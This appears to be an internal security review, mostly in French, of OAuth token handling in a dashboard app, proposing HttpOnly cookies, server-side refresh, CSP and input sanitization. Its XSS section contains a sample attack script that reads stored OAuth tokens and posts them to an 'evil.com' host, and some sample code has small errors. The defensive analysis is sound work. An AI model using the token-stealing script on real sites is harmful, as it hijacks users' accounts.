# Security Research - OAuth & Tokens

**Analysis Date:** 2026-02-11

## Current Architecture

**OAuth Flow Actuel:**
```
User → Dashboard → "Connect Google" → OAuth Provider → Callback URL
                              ↓
                         Dashboard (verifie token)
```

**Token Storage:**
- ❌ **localStorage** - Tokens stockés côté client
- ⚠️ Vulnérabilité: XSS peut exfiltrer les tokens

**OAuth Proxy:**
- ✅ Server Express existant: `server/oauth-proxy.ts`
- ✅ Route: `/oauth/{provider}/callback`
- ⚠️ Limitation: Tokens retournés au client (stockés en localStorage)

## Vulnerability Analysis

### XSS Risk (CRITICAL)

**Scenario d'attaque:**
```javascript
// Script malveillant injecté (XSS)
const stolenTokens = localStorage.getItem('oauth_tokens');
// → Envoyer à serveur attaquant
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify(stolenTokens)
});
```

**Impact:**
- Accès aux comptes Google/Microsoft/Notion
- Lecture/Modification de données utilisateur
- Actions malveillantes au nom de l'utilisateur

**Sources XSS potentielles:**
1. Markdown non-sanitisé (noms de listes, descriptions)
2. URLs mal formées (bookmarks)
3. Third-party widgets (si introduits)

### Security Headers

**Actuel:**
- ⚠️ Pas de CSP (Content Security Policy)
- ⚠️ Pas de X-Frame-Options
- ⚠️ Pas de Strict-Transport-Security

## Recommended Solutions

### Solution 1: HttpOnly Cookies (Recommandé)

**Architecture:**
```
OAuth Flow:
User → Dashboard → "Connect" → Proxy OAuth (Express)
                              ↓
                    Proxy reçoit token
                              ↓
                    Stocke en HttpOnly cookie
                              ↓
                    Dashboard ne voit PAS le token
                              ↓
                    Proxy inclut cookie dans requêtes API
```

**Implementation:**
```typescript
// server/oauth-proxy.ts
import express from 'express';
import cookie from 'cookie';

app.get('/oauth/google/callback', async (req, res) => {
  const { code } = req.query;
  const tokens = await exchangeCodeForTokens(code);
  
  // ✅ Stocker en HttpOnly cookie (non-accessible via JS)
  res.cookie('google_access', tokens.accessToken, {
    httpOnly: true,    // JS ne peut pas lire
    secure: true,      // HTTPS only
    sameSite: 'lax',   // CSRF protection
    maxAge: 3600      // 1 hour
  });
  
  // ✅ Retourner session ID (pas le token)
  res.json({ 
    success: true,
    sessionId: generateSessionId(tokens)
  });
});

// Proxy requests avec cookie
app.get('/api/google/tasks', async (req, res) => {
  const accessToken = req.cookies.google_access; // Cookie automatiquement envoyée
  
  // Ajouter Authorization header
  const response = await fetch('https://www.googleapis.com/tasks/v1/lists', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });
  
  return res.json(await response.json());
});
```

**Avantages:**
- ✅ Protection XSS (JS ne peut pas lire les cookies)
- ✅ Token refresh transparent (côté serveur)
- ✅ Aucune gestion token côté client
- ✅ Session invalidation facile

### Solution 2: SessionStorage (Alternative)

**Approche:**
```typescript
// Stocker en sessionStorage au lieu de localStorage
sessionStorage.setItem('oauth_tokens', JSON.stringify(tokens));

// ✅ Avantages: Nettoyé automatiquement à la fermeture
// ⚠️ Inconvénients: Persister uniquement sur un onglet
```

### Solution 3: CSP Headers (Complémentaire)

**Content Security Policy:**
```http
// Dans server/oauth-proxy.ts ou Vercel headers
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "connect-src 'self' https://accounts.google.com'; " +
    "frame-ancestors 'self'; " +
    "form-action 'self';"
  );
  next();
});
```

**Directives:**
- `default-src 'self'` - Ressources du même domaine uniquement
- `script-src 'self'` - Scripts internes seulement
- `connect-src` - Autoriser OAuth endpoints
- `frame-ancestors 'self'` - Prévenir clickjacking

## Implementation Strategy

### Phase 1: Backend Token Storage (Week 1-2)

**Modifier proxy Express:**
```typescript
// server/tokenManager.ts
class TokenManager {
  private sessions = new Map<string, TokenData>();
  
  createSession(tokens: OAuthTokens): string {
    const sessionId = crypto.randomBytes(16).toString('hex');
    this.sessions.set(sessionId, {
      accessToken: tokens.accessToken,
      refreshToken: tokens.refreshToken,
      expiresAt: Date.now() + 3600 * 1000
    });
    return sessionId;
  }
  
  getSession(sessionId: string) {
    return this.sessions.get(sessionId);
  }
  
  refreshAccessToken(sessionId: string): string {
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error('Session expired');
    
    // Refresh logic via refresh token
    const newTokens = await this.refresh(session.refreshToken);
    session.accessToken = newTokens.accessToken;
    session.expiresAt = Date.now() + 3600 * 1000;
    return session.accessToken;
  }
}
```

### Phase 2: Client Migration (Week 2-3)

**Adapter dashboard:**
```typescript
// src/lib/auth/proxyAuth.ts
export class ProxyAuthManager {
  async getAccessToken(provider: OAuthProvider): Promise<string> {
    const sessionId = localStorage.getItem('session_id');
    
    // ✅ Appeler proxy pour avoir l'access
    const response = await fetch(`/api/auth/${provider}/token`, {
      headers: {
        'X-Session-ID': sessionId
      }
    });
    
    if (!response.ok) {
      // Session expired, need to re-auth
      this.redirectToOAuth();
    }
    
    return response.token; // ou cookie automatique
  }
}
```

### Phase 3: CSP Implementation (Week 3-4)

```typescript
// vercel.json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://accounts.google.com https://login.live.com https://www.notion.so; frame-ancestors 'self';"
        }
      ]
    }
  ]
}
```

## Token Refresh Strategy

### Current State
```typescript
// src/lib/auth/oauthManager.ts
async getValidAccessToken(provider: OAuthProvider): Promise<string> {
  const connection = TokenStorage.getConnection(provider);
  
  if (!TokenStorage.isTokenExpired(connection)) {
    return connection.tokens.accessToken;
  }
  
  // ⚠️ Refresh côté client avec refresh token
  const refreshedTokens = await this.googleAuth.refreshAccessToken(
    connection.tokens.refreshToken
  );
  
  TokenStorage.updateTokens(provider, refreshedTokens);
  return refreshedTokens.accessToken;
}
```

### Recommended Approach (Server-Side)

```typescript
// Serveur gère le refresh automatiquement
app.use(async (req, res, next) => {
  const sessionId = req.cookies.session_id;
  const session = tokenManager.getSession(sessionId);
  
  if (!session || isExpired(session)) {
    // Auto-refresh transparent
    const newTokens = await refreshSession(session);
    res.cookie('google_access', newTokens.accessToken, { httpOnly: true });
  }
  
  // Attacher tokens à la requête
  req.googleTokens = session.tokens;
  
  next();
});
```

## Additional Security Measures

### 1. Input Validation (Zod)

```typescript
// Valider TOUT user input
import { z } from 'zod';

const todoSchema = z.object({
  title: z.string().min(1).max(200).regex(/^[^<>]*$/), // Pas de HTML
  description: z.string().max(1000).optional(),
  deadline: z.string().optional(),
});

// Utiliser dans widgets
const validatedData = todoSchema.parse(rawInput);
```

### 2. Output Sanitization

```typescript
// Nettoyer markdown avant affichage
import { DOMPurify } from 'dompurify';

function sanitizeMarkdown(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
  });
}
```

### 3. CSRF Protection

```typescript
// Vérifier Origin pour state-changing operations
app.post('/api/todos', (req, res) => {
  const origin = req.headers.origin;
  
  if (!ALLOWED_ORIGINS.includes(origin)) {
    return res.status(403).json({ error: 'Forbidden origin' });
  }
  
  // ...
});
```

## Implementation Checklist

### Phase 1: Backend Token Storage (Week 1-2)
- [ ] Créer TokenManager côté serveur
- [ ] Implémenter stockage HttpOnly cookies
- [ ] Ajouter endpoint `/api/{provider}/token`
- [ ] Implémenter auto-refresh côté serveur
- [ ] Tests sécurité XSS

### Phase 2: CSP Headers (Week 1-2)
- [ ] Définir politique CSP
- [ ] Implémenter headers dans Express/Vercel
- [ ] Tester CSP report mode
- [ ] Valider OAuth endpoints autorisés

### Phase 3: Client Migration (Week 2-3)
- [ ] Créer ProxyAuthManager
- [ ] Remplacer TokenStorage.getToken() par appels proxy
- [ ] Supprimer token storage côté client
- [ ] Tests migration

### Phase 4: Input Validation (Week 3-4)
- [ ] Schémas Zod pour tous les inputs
- [ ] DOMPurify pour markdown
- [ ] Sanitization URLs (bookmarks, RSS)
- [ ] Tests XSS attempts

## Security Checklist

### CSRF Protection
- [ ] SameSite cookies (lax/strict)
- [ ] Origin validation
- [ ] CSRF tokens pour state-changing

### Token Security
- [ ] HttpOnly cookies
- [ ] Secure flag (HTTPS only)
- [ ] Expiration timestamps
- [ ] Automatic refresh

### XSS Prevention
- [ ] Input sanitization
- [ ] Output encoding
- [ ] CSP headers
- [ ] Subresource Integrity (SRI)

## Anti-Patterns

❌ **Tokens en localStorage** - Vulnérable à XSS
❌ **Pas de CSP** - Pas de protection contre injection
❌ **Pas de validation input** - XSS possible
❌ **Refresh tokens côté client** - Plus exposé
❌ **Pas de SameSite cookies** - CSRF possible

---
*Security research: 2026-02-11*
